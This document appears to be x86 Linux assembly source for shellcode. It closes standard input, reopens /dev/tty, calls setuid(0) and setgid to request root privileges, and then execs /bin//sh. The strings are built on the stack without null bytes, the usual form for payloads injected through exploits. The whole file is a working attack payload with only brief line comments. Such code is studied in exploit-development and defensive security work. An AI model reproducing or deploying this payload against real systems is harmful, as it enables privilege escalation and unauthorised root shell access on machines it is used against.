;

global _start

section .text

	_start:        

           	add    esp,0x18		; reserves space in stack
        	
		xor    eax,eax		; eax=NULL
        	xor    ebx,ebx		; ebx=NULL
        	mov    al,0x6		; close syscall no
        	int    0x80		; informs kernel for execution
         	
		; /dev/tty null terminated
		
		push   ebx		; NULL 
         	push   0x7974742f	; ytt/
         	push   0x7665642f	; ved/
         	mov    ebx,esp		; address of /dev/tty
         	xor    ecx,ecx		; ecx=NULL
         	mov    cx,0x2712	; O_RDWR
         	mov    al,0x5		; open syscall no
         	int    0x80		; informs kernel for execution
         	
		push   0x17		
         	pop    eax		; setuid syscall no eax=23
         	xor    ebx,ebx		; ebx=0 ; root user UID
         	int    0x80		; informs kernel for execution
         	
		push   0x2e		
         	pop    eax		; setgid syscall no eax=46
         	push   ebx		
         	int    0x80		; informs kernel for execution
         	
		xor    eax,eax		; eax=NULL
         	push   eax		; NULL 
         	push   0x68732f2f	; hs//
         	push   0x6e69622f	; nib/
         	mov    ebx,esp		; null terminated /bin//sh
         	
		push   eax		; NULL
         	push   ebx		; address of null terminated /bin//sh
         	mov    ecx,esp		; argv
         	cdq    			; edx=0
         	mov    al,0xb		; execve syscall no
         	int    0x80		; informs kernel
